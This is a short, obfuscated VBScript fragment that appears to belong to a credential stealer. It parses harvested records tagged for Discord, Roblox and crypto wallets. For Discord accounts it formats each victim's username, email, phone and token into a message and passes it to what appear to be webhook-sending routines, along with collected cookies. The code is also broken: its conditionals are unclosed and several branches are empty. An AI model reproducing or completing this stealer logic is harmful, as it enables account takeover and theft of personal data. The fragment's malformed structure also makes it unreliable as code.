Sub G2()

  Dim ln:ln=Split(rd,Chr(13)&Chr(10))

  Dim i
  For i=0 To UBound(ln)
    If Len(ln(i))<10 Then
    ElseIf Left(ln(i),8)="DISCORD|" Then
      Dim p:p=Split(Mid(ln(i),9),"|")
      If UBound(p)>=4 Then
        Dim inf:inf="**User:** "&p(0)&Chr(10)
        If p(1)<>"" Then inf=inf&"**Email:** "&p(1)&Chr(10)
        If p(2)<>"" Then inf=inf&"**Phone:** "&p(2)&Chr(10)

        inf=inf&"**Token:** ||"&p(4)&"||"
        Call H1(a69,inf,5793266,a4):cnt=cnt+1

    ElseIf Left(ln(i),7)="ROBLOX|" Or Left(ln(i),9)="ROBLOXMS|" Then

    ElseIf Left(ln(i),7)="WALLET|" Then

  Next

  If Len(ck)=0 And InStr(raw,a75)>0 Then

  Call H2(a78,ck,a4)
